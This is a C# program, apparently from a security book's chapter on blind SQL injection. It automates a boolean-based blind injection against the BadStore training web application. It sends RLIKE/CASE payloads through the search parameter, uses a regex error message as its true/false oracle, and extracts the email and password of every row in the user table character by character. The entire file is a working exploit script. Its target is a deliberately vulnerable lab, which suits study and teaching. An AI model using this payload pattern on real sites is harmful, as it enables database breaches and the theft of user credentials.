using System;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace ch2_sqli_blind
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			string host = args [0];
			int countLength = 0;
			for (;;countLength++) {
				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM badstoredb.userdb)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";

				string response = MakeRequest (host, getCountLength);

				if (response.Contains ("parentheses not balanced"))
					break;
			}

			List<byte> countBytes = new List<byte> ();
			for (int i = 1; i <= countLength; i++) {
				for (int c = 48; c <= 58; c++) { 
					string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM badstoredb.userdb)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
					string response = MakeRequest (host, getCount);

					if (response.Contains ("parentheses not balanced")) {
						countBytes.Add ((byte)c);
						break;
					}
				}
			}

			int count = int.Parse (Encoding.ASCII.GetString (countBytes.ToArray ()));

			Console.WriteLine ("There are "+count+" rows in the userdb table");

			for (int row = 0; row < count; row++) {
				foreach (string column in new string[] { "email", "passwd" }) {
					Console.Write("Getting length of query value... ");
					int valLength = GetLength (host, row, column);
					Console.WriteLine (valLength);

					Console.Write ("Getting value... ");
					string value = GetValue (host, row, column, valLength);

					Console.WriteLine (value);
				}
			}
		}

		private static int GetLength(string host, int row, string column) {
			int countLength = 0;
			for (;; countLength++) {
				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20)) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";

				string response = MakeRequest (host, getCountLength);

				if (response.Contains ("parentheses not balanced"))
					break;
			}

			List<byte> countBytes = new List<byte> ();
			for (int i = 1; i <= countLength; i++) {
				for (int c = 48; c <= 58; c++) {
					string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT " + row + ",1)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
					string response = MakeRequest (host, getLength);

					if (response.Contains ("parentheses not balanced")) { 
						countBytes.Add ((byte)c);
						break;
					}
				}
			}

			return int.Parse (Encoding.ASCII.GetString (countBytes.ToArray ()));
		}

		private static string GetValue(string host, int row, string column, int length) {
			List<byte> valBytes = new List<byte> ();
			for (int i = 1; i <= length; i++) {
				for (int c = 32; c <= 126; c++) {
					string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST("+column+" AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1),"+i+",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
					string response = MakeRequest (host, getChar);

					if (response.Contains ("parentheses not balanced")) {
						valBytes.Add ((byte)c);
						break;
					}
				}
			}
			return Encoding.ASCII.GetString(valBytes.ToArray());
		}

		private static string MakeRequest(string host, string payload) {
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create ("http://"+host+"/cgi-bin/badstore.cgi?action=search&searchquery="+Uri.EscapeUriString(payload));

			string response = string.Empty;
			using (StreamReader reader = new StreamReader (request.GetResponse ().GetResponseStream ()))
				response = reader.ReadToEnd ();

			return response;
		}
	}
}
